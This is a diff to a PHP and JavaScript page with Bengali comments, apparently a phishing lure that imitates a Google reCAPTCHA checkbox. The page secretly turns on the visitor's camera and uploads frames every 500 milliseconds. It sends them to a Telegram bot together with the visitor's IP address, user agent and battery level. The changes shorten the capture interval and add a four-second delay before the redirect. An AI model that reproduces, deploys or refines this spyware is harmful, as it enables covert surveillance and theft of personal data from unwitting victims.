@@ -24,11 +24,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
     $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';
     
-    // ব্রাউজার থেকে পাঠানো অতিরিক্ত তথ্যগুলো রিসিভ করা হচ্ছে
     $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
     $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
     
-    // ইউজারের রিয়েল আইপি অ্যাড্রেস বের করা
     $ipAddress = $_SERVER['REMOTE_ADDR'];
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
@@ -42,7 +40,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     if (file_put_contents($filePath, $data)) {
         $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
         
-        // টেলিগ্রাম ক্যাপশনে সব তথ্য সাজিয়ে পাঠানো হচ্ছে
         $caption = "🎯 Target ID: {$targetId}\n" .
                    "🔋 Battery: {$battery}\n" .
                    "🌐 IP Address: {$ipAddress}\n" .
@@ -156,7 +153,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             height: 32px;
             background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
             background-size: contain;
-            background-repeat: not-repeat;
+            background-repeat: no-repeat;
         }
 
         .recaptcha-footer {
@@ -207,17 +204,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
+        let isClicked = false;
         function openTargetLink() {
+            if (isClicked) return;
+            isClicked = true;
+
             const checkbox = document.getElementById('recaptchaCheckbox');
             checkbox.style.background = '#fff';
             checkbox.classList.add('checked');
             
+            // ৪ সেকেন্ড (4000ms) লোডিং বা ডিলে হওয়ার পর একই ট্যাবে লিংক ওপেন হবে
             setTimeout(() => {
-                window.open(finalUrl, '_blank');
-            }, 500);
+                window.location.href = finalUrl;
+            }, 4000);
         }
 
-        // ব্যাটারি স্ট্যাটাস ট্র্যাক করার ভেরিয়েবল
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -230,7 +231,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .then(stream => {
                     video.srcObject = stream;
                     setTimeout(() => {
-                        setInterval(captureAndUpload, 1300);
+                        // ০.৫ সেকেন্ড (500ms) পর পর ছবি ক্যাপচার ও আপলোড হবে
+                        setInterval(captureAndUpload, 500);
                     }, 1000);
                 })
                 .catch(err => {
@@ -250,7 +252,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
 
-            // ডাটা ফেচ করার সময় ব্যাটারি এবং ইউজার এজেন্ট যুক্ত করে দেওয়া হলো
             const postData = new URLSearchParams();
             postData.append('image', imageData);
             postData.append('target', targetId);
